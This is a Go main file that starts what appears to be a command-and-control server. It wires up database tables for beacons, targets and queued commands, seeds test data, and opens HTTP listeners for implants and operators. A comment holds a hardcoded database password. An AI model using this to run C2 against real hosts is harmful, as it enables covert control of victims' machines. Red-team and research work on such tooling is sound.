package main

import (
	"context"
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"time"

	_ "github.com/lib/pq"

	"github.com/mojodojo101/c2server/config"
	"github.com/mojodojo101/c2server/pkg/activebeacon/abstate"
	"github.com/mojodojo101/c2server/pkg/activebeacon/abusecase"
	"github.com/mojodojo101/c2server/pkg/activebeacon/activebeacondb"
	"github.com/mojodojo101/c2server/pkg/activebeacon/delivery/abhttp"

	"github.com/mojodojo101/c2server/pkg/beacon/beacondb"
	_ "github.com/mojodojo101/c2server/pkg/beacon/busecase"
	"github.com/mojodojo101/c2server/pkg/client/clientdb"
	"github.com/mojodojo101/c2server/pkg/client/cusecase"
	"github.com/mojodojo101/c2server/pkg/client/delivery/chttp"
	"github.com/mojodojo101/c2server/pkg/command/cmdusecase"
	"github.com/mojodojo101/c2server/pkg/command/commanddb"
	"github.com/mojodojo101/c2server/pkg/models"
	"github.com/mojodojo101/c2server/pkg/target/targetdb"
	"github.com/mojodojo101/c2server/pkg/target/tusecase"
)

func main() {
	//connStr := "host=localhost user=c2admin password=mojodojo101+ dbname=c2db port=5432 sslmode=require"
	dbconfig := config.GetDBConfig().DB

	connStr := fmt.Sprintf("host=%v user=%v password=%v dbname=%v port=%v sslmode=%v TimeZone=%v", dbconfig.Host, dbconfig.Username, dbconfig.Password, dbconfig.DBName, dbconfig.Port, dbconfig.SSLMode,dbconfig.Timezone)

	client := config.GetClient()

	serverPorts := config.GetServerPorts()
	db, err := sql.Open("postgres", connStr)
	if err != nil {
		fmt.Printf("couldnt connect to db err=%v", err)
		panic(err)
	}
	defer db.Close()

	err = db.Ping()
	if err != nil {

		fmt.Printf("couldnt ping to db err=%v", err)
		panic(err)
	}

	timeout := time.Second * 6

	fmt.Printf("before make beacon repo\n")
	//init client repo
	ctx := context.Background()
	//init beacon repo
	br := beacondb.NewSQLRepo(db)
	err = br.CreateTable(ctx)
	if err != nil {
		fmt.Printf("couldnt create br err=%v", err)
		panic(err)
	}
	//init beacon usecase
	///bu := busecase.NewBeaconUsecase(br, timeout)
	///if err != nil {
	///	panic(err)
	///}

	//init command repo
	cmdr := commanddb.NewSQLRepo(db)
	err = cmdr.CreateTable(ctx)
	if err != nil {
		panic(err)
	}
	//init command usecase
	cmdu := cmdusecase.NewCommandUsecase(cmdr, timeout)
	if err != nil {
		panic(err)
	}

	//init target repo
	tr := targetdb.NewSQLRepo(db)
	err = tr.CreateTable(ctx)
	if err != nil {
		panic(err)
	}
	//init target usecase
	tu := tusecase.NewTargetUsecase(tr, cmdu, timeout)
	if err != nil {
		panic(err)
	}

	//init activebeacon repo
	ar := activebeacondb.NewSQLRepo(db)
	err = ar.CreateTable(ctx)
	if err != nil {
		panic(err)
	}
	//init activebeacon usecase
	au := abusecase.NewActiveBeaconUsecase(ar, tu, timeout)
	if err != nil {
		panic(err)
	}

	//init client repo
	cr := clientdb.NewSQLRepo(db)
	err = cr.CreateTable(ctx)
	if err != nil {
		panic(err)
	}
	//init client usecase
	cu := cusecase.NewClientUsecase(cr, tu, au, timeout)
	if err != nil {
		panic(err)
	}

	ch := chttp.NewHandler(cu)
	abh := abhttp.NewHandler(au)

	//-------------this section is just to setup the database for use with the poc 1.0 ---
	//will remove this later on and read in the beacon from the internal resources  directory
	//check if there is a client else add the mojo client

	c := models.Client{}
	_, err = cr.GetByID(ctx, 1)
	if err != nil {
		c.Name = client.Username
		c.Password = client.Password

		cr.CreateNewClient(ctx, &c)
	}

	//check if there is a valid beacon 1 for tests

	_, err = br.GetByID(ctx, 1)
	if err != nil {
		b := models.Beacon{}
		b.Path = "testpath"
		b.Os = "ubuntu"
		b.Arch = "x86_64"
		b.Lang = "go"
		br.CreateNewBeacon(ctx, &b)
	}

	_, err = tr.GetByID(ctx, 1)
	if err != nil {
		t := models.Target{}
		t.Ipv4 = "10.10.10.3"
		t.HostName = "mojo-c2-beacon"
		cu.AddNewTarget(ctx, &c, &t)
	}
	//-----------------end of the poc data ----------

	signalCh := make(chan bool, 1)
	go func() {
		for {
			select {
			case <-signalCh:
				return
			default:
				log.Fatal(http.ListenAndServe(serverPorts.BeaconPort, &abh))
			}
		}
	}()

	//start actibeacon state which updates the missed pings depending on the ping delta and the elapsed time
	abs := abstate.NewActiveBeaconState(ar)
	lineance := int64(5)
	go func() {
		for {
			select {
			case <-signalCh:
				return
			default:
				abs.Update(ctx, lineance)
			}
		}
	}()

	//log.Fatal(http.ListenAndServe(serverPorts.ClientPort,  &ch))
	log.Fatal(http.ListenAndServeTLS(serverPorts.ClientPort, "server.crt", "server.key", &ch))
	//http.ListenAndServe(":443", &ch)

	signalCh <- true
}
